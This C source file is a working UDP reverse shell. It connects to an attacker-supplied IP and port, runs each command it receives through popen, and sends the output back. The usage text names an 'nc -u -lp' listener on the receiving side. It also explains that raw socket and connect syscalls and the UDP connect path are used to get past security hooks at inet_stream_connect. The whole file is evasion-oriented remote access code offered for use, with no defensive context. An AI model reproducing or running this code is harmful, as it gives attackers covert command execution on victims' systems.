#define _GNU_SOURCE
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <poll.h>

#define CMD_MAX  4096
#define OUT_MAX  65000
#define PROMPT   "$ "

static int raw_socket(void)
{
    return (int)syscall(__NR_socket, AF_INET, SOCK_DGRAM, IPPROTO_UDP);
}

static int raw_connect(int sock, const struct sockaddr_in *addr)
{
    return (int)syscall(__NR_connect, sock,
                        (const struct sockaddr *)addr, sizeof(*addr));
}

int main(int argc, char *argv[])
{
    if (argc < 3) {
        fprintf(stderr, "usage: %s [args]\n", argv[0]);
        fprintf(stderr,
            "\nrx side: nc -u -lp <port>\n"
            "  type commands, get output back as UDP datagrams\n"
            "\nbypasses:\n"
            "  hooks at inet_stream_connect - UDP connect goes through\n"
            "  inet_dgram_connect, a different function\n"
            "  socket() and connect() calls are also made via raw syscall\n");
        return 1;
    }

    const char *ip = argv[1];
    int         port = atoi(argv[2]);

    struct sockaddr_in remote = {
        .sin_family = AF_INET,
        .sin_port   = htons((uint16_t)port),
    };
    if (inet_pton(AF_INET, ip, &remote.sin_addr) != 1) {
        fprintf(stderr, "[!] bad IP: %s\n", ip); return 1;
    }

    int sock = raw_socket();
    if (sock < 0) { perror("socket"); return 1; }

    if (raw_connect(sock, &remote) < 0) { perror("connect"); return 1; }

    send(sock, PROMPT, strlen(PROMPT), 0);

    char cmd[CMD_MAX + 1];
    char out[OUT_MAX + 1];

    for (;;) {
        struct pollfd pfd = { .fd = sock, .events = POLLIN };
        if (poll(&pfd, 1, -1) < 0) {
            if (errno == EINTR) continue;
            break;
        }

        ssize_t n = recv(sock, cmd, CMD_MAX, 0);
        if (n <= 0) break;
        cmd[n] = '\0';

        while (n > 0 && (cmd[n-1] == '\n' || cmd[n-1] == '\r' || cmd[n-1] == ' '))
            cmd[--n] = '\0';

        if (n == 0) {
            send(sock, PROMPT, strlen(PROMPT), 0);
            continue;
        }

        if (strcmp(cmd, "exit") == 0 || strcmp(cmd, "quit") == 0) break;

        FILE *f = popen(cmd, "r");
        if (!f) {
            const char *msg = "popen failed\n";
            send(sock, msg, strlen(msg), 0);
            send(sock, PROMPT, strlen(PROMPT), 0);
            continue;
        }

        size_t total = 0;
        size_t r;
        while (total < OUT_MAX &&
               (r = fread(out + total, 1, OUT_MAX - total, f)) > 0)
            total += r;
        pclose(f);
        out[total] = '\0';

        if (total > 0) send(sock, out, total, 0);
        send(sock, PROMPT, strlen(PROMPT), 0);
    }

    close(sock);
    return 0;
}
